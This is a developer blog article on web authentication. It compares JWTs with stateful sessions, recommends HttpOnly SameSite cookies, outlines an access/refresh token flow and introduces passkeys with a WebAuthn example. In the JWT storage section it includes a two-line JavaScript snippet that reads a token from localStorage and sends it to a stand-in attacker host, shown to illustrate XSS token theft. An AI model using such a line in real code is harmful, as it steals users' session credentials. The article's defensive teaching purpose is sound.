---
title: "Modern Web Security: JWTs, HttpOnly Sessions, and the Era of Passkeys"
date: "2024-11-18"
category: "Web Security"
tags: ["Security", "Authentication", "JWT", "Passkeys", "Web Development"]
description: "A comprehensive developer guide to authentication: comparing stateless JSON Web Tokens vs stateful sessions, avoiding XSS/CSRF exploits, and adopting WebAuthn Passkeys."
featured: false
---

Authentication and authorization are the backbone of web security. Yet, developers often find themselves caught in passionate debates: *Should you store JWTs in localStorage? Are server-side sessions obsolete? How do Passkeys change the game?*

In this article, we cut through the confusion to explain the tradeoffs and best practices for securing modern web applications.

---

## 1. The Great Debate: JWT vs. Stateful Sessions

| Dimension | Stateful Server Sessions | Stateless JWTs |
| :--- | :--- | :--- |
| **Storage Location** | Server database or Redis memory cache | Inside the token payload (on client) |
| **Revocation** | Instantaneous (delete session row/key) | Hard to invalidate before expiration (`exp`) |
| **Horizontal Scaling** | Requires shared session store (Redis) | Trivial (any server with secret can verify) |
| **Payload Size** | Small cookie ID (32 bytes) | Larger (several hundred bytes to kilobytes) |

### The Critical JWT Pitfall: Client-Side Storage

Storing JWT tokens in `localStorage` or `sessionStorage` leaves them completely vulnerable to **Cross-Site Scripting (XSS)**. Any compromised third-party script (analytics, ad trackers, or dependency injection) can execute:

```javascript
// Any XSS vulnerability can extract tokens immediately:
const stolenToken = localStorage.getItem("auth_token");
fetch("https://attacker-server.com/steal?token=" + stolenToken);
```

### The Recommended Pattern: HttpOnly, SameSite Cookies

Store sensitive tokens in `HttpOnly` cookies. JavaScript running in the browser cannot read or extract `HttpOnly` cookies:

```http
Set-Cookie: session_token=abc123xyz; Secure; HttpOnly; SameSite=Lax; Path=/
```

- **`Secure`**: Ensures cookies are only sent over encrypted HTTPS connections.
- **`HttpOnly`**: Blocks JavaScript access via `document.cookie`.
- **`SameSite=Lax` or `Strict`**: Prevents Cross-Site Request Forgery (CSRF) by ensuring cookies are not attached to cross-origin requests.

---

## 2. Token Architecture: Access Token + Refresh Token Flow

For modern SPAs and mobile apps that need stateless verification, the dual-token architecture offers the best security balance:

```
[Client]                [API Gateway]               [Auth Server]
   |                          |                           |
   |--- 1. Login with creds ->--------------------------->|
   |<-- 2. Return Short-lived Access Token (15m) ---------|
   |    + HttpOnly Refresh Token Cookie (7d) -------------|
   |                          |                           |
   |--- 3. API call with Access Token Bearer ------------>|
   |    (Instant verification using public key)          |
   |                          |                           |
   |--- 4. Access Token expired? ------------------------>|
   |--- 5. Call /refresh with HttpOnly Cookie ----------->|
   |<-- 6. Issue new short-lived Access Token ------------|
```

If a short-lived access token leaks, the attacker's window of opportunity is limited to 15 minutes. The refresh token can be revoked in Redis instantly if suspicious activity is detected.

---

## 3. The Future is Here: Passkeys & WebAuthn

Passkeys eliminate shared secrets (passwords) entirely using asymmetric public-key cryptography built into modern operating systems (Touch ID, Face ID, Windows Hello).

### Why Passkeys Win
- **Phishing Resistant**: The browser binds the cryptographic signature to the exact origin (`domain.com`). Even if a user visits a lookalike phishing site (`evil-domain.com`), the browser refuses to sign the authentication challenge.
- **No Passwords to Leak**: Databases only store public keys. A database breach reveals zero credentials.
- **Superior UX**: Users log in with a single biometric touch instead of 16-character passwords with symbols and 2FA SMS codes.

```javascript
// Registering a Passkey in Modern Browsers
const credential = await navigator.credentials.create({
  publicKey: {
    challenge: serverGeneratedRandomBuffer,
    rp: { name: "Karim Shabana Blog", id: "example.com" },
    user: {
      id: new Uint8Array([1, 2, 3, 4]),
      name: "karim@example.com",
      displayName: "Karim Shabana",
    },
    pubKeyCredParams: [{ alg: -7, type: "public-key" }], // ES256
    authenticatorSelection: { userVerification: "preferred" },
    timeout: 60000,
  },
});
```

---

## Security Checklist for Modern Web Apps

- [x] Set `Secure`, `HttpOnly`, and `SameSite=Lax` on all authentication cookies.
- [x] Enforce Content Security Policy (CSP) headers to mitigate inline script injections.
- [x] Limit Access Token lifetime to 15 minutes or less.
- [x] Rate limit authentication endpoints (`/api/login`, `/api/forgot-password`).
- [x] Prepare your authentication stack for Passkeys (WebAuthn).
